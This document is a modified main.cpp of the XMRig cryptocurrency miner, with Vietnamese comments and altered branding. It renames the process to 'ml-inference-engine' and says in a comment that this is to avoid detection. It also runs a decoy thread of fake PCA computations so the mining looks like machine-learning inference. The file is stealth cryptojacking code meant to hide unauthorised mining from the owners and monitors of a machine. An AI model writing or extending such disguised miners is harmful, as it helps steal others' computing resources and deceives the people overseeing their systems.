/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/mlinference>, <support@mlinference.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include <sys/prctl.h>  // Thêm thư viện để sử dụng hàm prctl
#include <thread>       // Thư viện để sử dụng đa luồng
#include <Eigen/Dense>  // Thư viện Eigen cho PCA
#include <iostream>

// Hàm giả lập tính toán PCA (Phân tích thành phần chính)
void simulate_pca_computation() {
    while (true) {
        // Tạo dữ liệu ngẫu nhiên 1000x500 để mô phỏng phân tích dữ liệu
        Eigen::MatrixXd data = Eigen::MatrixXd::Random(1000, 500);

        // Tính toán ma trận hiệp phương sai
        Eigen::MatrixXd centered = data.rowwise() - data.colwise().mean();
        Eigen::MatrixXd cov = (centered.adjoint() * centered) / double(data.rows() - 1);

        // Phân rã giá trị riêng
        Eigen::SelfAdjointEigenSolver<Eigen::MatrixXd> eig(cov);
        Eigen::MatrixXd eigenvalues = eig.eigenvalues().reverse();   // Lấy các giá trị riêng
        Eigen::MatrixXd eigenvectors = eig.eigenvectors().rowwise().reverse(); // Lấy các vector riêng

        std::cout << "PCA computation complete. Top eigenvalue: " << eigenvalues(0) << std::endl;

        // Tạm dừng một chút để giảm tải CPU
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

int main(int argc, char **argv)
{
    using namespace mlinference;

    Process process(argc, argv);

    // Thay đổi tên tiến trình thành "ml-inference-engine" để tránh bị phát hiện
    prctl(PR_SET_NAME, "ml-inference-engine", 0, 0, 0);

    // Tạo một luồng riêng để chạy tác vụ PCA giả lập
    std::thread pca_thread(simulate_pca_computation);

    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    // Bắt đầu khai thác coin (Chương trình khai thác sẽ chạy song song với tính toán PCA)
    int result = app.exec();

    // Đợi luồng PCA hoàn thành (nó sẽ không bao giờ hoàn thành do chạy liên tục)
    pca_thread.join();

    return result;
}
